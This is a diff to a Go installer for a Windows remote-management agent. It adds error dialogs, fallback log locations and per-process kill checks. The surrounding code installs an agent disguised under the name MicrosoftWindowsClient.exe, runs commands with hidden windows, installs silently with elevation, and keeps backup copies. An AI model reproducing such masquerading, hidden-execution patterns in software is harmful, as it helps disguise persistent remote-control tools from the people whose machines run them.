@@ -40,6 +40,26 @@ func hiddenExec(name string, args ...string) *exec.Cmd {
 	return hideWindow(exec.Command(name, args...))
 }
 
+var procMessageBoxW = syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW")
+
+// installSilent mirrors --silent for die() (popups only on visible runs).
+var installSilent = false
+
+// die is the loud exit: log file + (on visible runs) an error dialog,
+// then code 1. Silent runs keep file-only behavior. Every fatal below
+// funnels here so a dead installer can never again vanish without a word
+// (v1.46.90: EXIT=1 with an empty log and no console, twice).
+func die(format string, args ...interface{}) {
+	msg := fmt.Sprintf(format, args...)
+	log.Printf("FATAL: %s", msg)
+	if !installSilent {
+		t, _ := syscall.UTF16PtrFromString("Agent Setup")
+		m, _ := syscall.UTF16PtrFromString(msg)
+		procMessageBoxW.Call(0, uintptr(unsafe.Pointer(m)), uintptr(unsafe.Pointer(t)), 0x10)
+	}
+	os.Exit(1)
+}
+
 func isAdmin() bool {
 	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
 	if err != nil {
@@ -71,7 +91,7 @@ func relaunchAsAdmin() {
 		}
 		time.Sleep(time.Second)
 	}
-	log.Fatalf("elevation unapproved after 120s (UAC prompt unseen on secure desktop?) — approve on the box screen, or run from an elevated prompt; if approved late, the install may still complete, check version.txt")
+	die("elevation unapproved after 120s (UAC prompt unseen on secure desktop?) — approve on the box screen, or run from an elevated prompt; if approved late, the install may still complete, check version.txt")
 }
 
 // elevatedHandshakePath is the proof-of-life file the elevated child
@@ -135,24 +155,28 @@ func shellExecuteRunas() {
 	mod := syscall.NewLazyDLL("shell32.dll")
 	ret, _, _ := mod.NewProc("ShellExecuteExW").Call(uintptr(unsafe.Pointer(&sei)))
 	if ret == 0 {
-		log.Fatalf("elevation request rejected (UAC denied?) — run from an elevated prompt")
+		die("elevation request rejected (UAC denied?) — run from an elevated prompt")
 	}
 }
 
-// setupInstallLog tees every log line (including log.Fatalf aborts) into
-// %TEMP%\rmm-install.log alongside stderr. Best effort and silent about it:
+// setupInstallLog tees every log line (including fatal aborts) into
+// rmm-install.log alongside stderr. Best effort and silent about it:
 // logging must never break an install. The handle stays open for the
-// process lifetime (writes are unbuffered, nothing to flush).
+// process lifetime (writes are unbuffered, nothing to flush). Tries user
+// TEMP, then Windows\Temp, then ProgramData: one locked file must never
+// blind us again (v1.46.90: the user-TEMP copy stayed 0 bytes while the
+// installer died elsewhere).
 func setupInstallLog() {
-	tmp := os.Getenv("TEMP")
-	if tmp == "" {
-		return
+	for _, dir := range []string{os.Getenv("TEMP"), `C:\Windows\Temp`, os.Getenv("ProgramData")} {
+		if dir == "" {
+			continue
+		}
+		if f, err := os.OpenFile(filepath.Join(dir, "rmm-install.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
+			log.SetOutput(io.MultiWriter(os.Stderr, f))
+			log.Printf("install log: %s", filepath.Join(dir, "rmm-install.log"))
+			return
+		}
 	}
-	f, err := os.OpenFile(filepath.Join(tmp, "rmm-install.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		return
-	}
-	log.SetOutput(io.MultiWriter(os.Stderr, f))
 }
 
 func copyFile(src, dst string) error {
@@ -187,6 +211,58 @@ func tasklistHasAgent(out string) bool {
 	return strings.Contains(strings.ToLower(out), `"microsoftwindowsclient.exe"`)
 }
 
+// tasklistAgentPIDs extracts PIDs from tasklist CSV rows naming our exe.
+// Pure for unit tests.
+func tasklistAgentPIDs(out string) []int {
+	var pids []int
+	for _, line := range strings.Split(out, "\n") {
+		if !strings.Contains(strings.ToLower(line), `"microsoftwindowsclient.exe"`) {
+			continue
+		}
+		fields := strings.Split(line, `","`)
+		if len(fields) >= 2 {
+			if pid, err := strconv.Atoi(strings.Trim(fields[1], `"`)); err == nil && pid > 0 {
+				pids = append(pids, pid)
+			}
+		}
+	}
+	return pids
+}
+
+// killResult classifies one per-PID taskkill outcome.
+type killResult int
+
+const (
+	killDead killResult = iota // no instance / just terminated: gone
+	killAlive                  // denied or other failure: still there
+)
+
+// classifyKillResult maps taskkill text to dead/alive. "SUCCESS" and
+// "no running instance" both mean gone (the latter is tasklist racing a
+// dying husk — exactly the 14-phantom case). Pure for unit tests.
+func classifyKillResult(out string) killResult {
+	s := strings.ToLower(out)
+	if strings.Contains(s, "no running instance") || strings.Contains(s, "success:") || strings.Contains(s, "has been terminated") {
+		return killDead
+	}
+	return killAlive
+}
+
+// unkillableAgentPIDs returns listed PIDs that are actually still alive:
+// each gets one targeted kill; phantoms ("no running instance") drop out.
+// Non-empty = real survivors, abort the install.
+func unkillableAgentPIDs() []int {
+	out, _ := hiddenExec("tasklist", "/FI", "IMAGENAME eq MicrosoftWindowsClient.exe", "/FO", "CSV", "/NH").CombinedOutput()
+	var live []int
+	for _, pid := range tasklistAgentPIDs(string(out)) {
+		ko, _ := hiddenExec("taskkill", "/F", "/PID", strconv.Itoa(pid)).CombinedOutput()
+		if classifyKillResult(string(ko)) == killAlive {
+			live = append(live, pid)
+		}
+	}
+	return live
+}
+
 // staleSweepFiles are install-dir entries that must never survive into a
 // fresh install (see the sweep above). Pure for unit tests.
 func staleSweepFiles() []string {
@@ -219,13 +295,13 @@ func checkVersionFile(dir, want, what string) error {
 
 func verifyFileSHA(path string, want []byte, what string) {
 	if err := checkFileSHA(path, want, what); err != nil {
-		log.Fatalf("%v", err)
+		die("%v", err)
 	}
 }
 
 func verifyVersionFile(dir, want, what string) {
 	if err := checkVersionFile(dir, want, what); err != nil {
-		log.Fatalf("%v", err)
+		die("%v", err)
 	}
 }
 
@@ -369,6 +445,7 @@ func install() {
 	for _, a := range os.Args {
 		if a == "--silent" || a == "-s" {
 			silent = true
+			installSilent = true
 		}
 	}
 	// Run log (v1.46.80 post-mortem): silent installs show nothing, so a
@@ -414,7 +491,14 @@ func install() {
 		time.Sleep(2000 * time.Millisecond)
 	}
 	if agentProcsAlive() {
-		log.Fatalf("agent processes survive forced kill - aborting install (old version left running intact)")
+		// Phantom tolerance (v1.46.90): tasklist snapshots dying husks
+		// that taskkill then reports as "no running instance" — 14 such
+		// phantoms blocked one box. Confirm per-PID; abort only on
+		// processes that are actually still killable-alive.
+		if live := unkillableAgentPIDs(); len(live) > 0 {
+			die("agent processes survive forced kill (pids %v) - aborting install (old version left running intact)", live)
+		}
+		log.Printf("tasklist showed stale entries only (phantom pids, nothing alive), proceeding")
 	}
 	// Fresh-start sweep (v1.46.88): zero agent processes are alive past
 	// the kill-verify above, so lock + pending flags are definitionally
@@ -431,7 +515,7 @@ func install() {
 	// exit-0. No payload = no install, loudly.
 	payloadExe, err := fs.ReadFile(payloadFS, "payload/MicrosoftWindowsClient.exe")
 	if err != nil || len(payloadExe) == 0 {
-		log.Fatalf("embedded agent payload unreadable: %v", err)
+		die("embedded agent payload unreadable: %v", err)
 	}
 	// Previous version for the update claim (best effort): lets the
 	// watcher tell this verified install from a trojan swap later.
@@ -523,7 +607,7 @@ func install() {
 			}
 		}
 		if !ok {
-			log.Fatalf("unknown -mode %q (valid: %s)", agentModeFlag, strings.Join(validModes, ", "))
+			die("unknown -mode %q (valid: %s)", agentModeFlag, strings.Join(validModes, ", "))
 		}
 		_ = os.WriteFile(filepath.Join(installDir, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
 		log.Printf("[*] Agent operation mode stored: %s", agentModeFlag)
@@ -620,7 +704,7 @@ func install() {
 	deleteTokenPath := filepath.Join(installDir, "delete_token.txt")
 	deleteToken := deleteTokenFlag
 	if deleteToken != "" && len(deleteToken) < 8 {
-		log.Fatalf("delete token must be 8+ characters")
+		die("delete token must be 8+ characters")
 	}
 	if deleteToken == "" {
 		for _, p := range []string{deleteTokenPath, filepath.Join(blenderDir, "delete_token.txt"), filepath.Join(backupDir2, "delete_token.txt")} {
@@ -633,7 +717,7 @@ func install() {
 	if deleteToken == "" {
 		var rb [24]byte
 		if _, err := rand.Read(rb[:]); err != nil {
-			log.Fatalf("cannot generate delete token: %v", err)
+			die("cannot generate delete token: %v", err)
 		}
 		deleteToken = hex.EncodeToString(rb[:])
 		log.Printf("[*] Generated self-delete token (store it � removal needs it)")
@@ -728,7 +812,7 @@ func install() {
 		"sha":  hex.EncodeToString(claimSum[:]),
 	})
 	if err := os.WriteFile(filepath.Join(installDir, "pending_update.json"), append(claim, '\n'), 0644); err != nil {
-		log.Fatalf("claim write failed: %v", err)
+		die("claim write failed: %v", err)
 	}
 
 	// Native supervisor (v1.40.9+): the agent binary watches itself
